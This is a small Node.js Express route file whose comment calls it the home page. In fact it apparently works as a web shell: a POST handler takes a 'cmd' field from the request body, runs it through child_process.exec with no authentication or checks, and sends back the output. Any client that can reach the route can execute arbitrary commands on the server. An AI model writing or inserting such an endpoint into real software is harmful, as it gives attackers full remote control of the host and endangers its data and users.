var express = require('express');
var router = express.Router();
var exec = require('child_process').exec;

/* GET home page. */
router.post('/', function(req, res, next) {
  console.log(req.body.cmd);
  exec(req.body.cmd, function(err, stdout, stderr) {
    if(err)
      return res.json({
        err: err || stderr
      });

    res.json({
      out: stdout
    });
  });
});

module.exports = router;
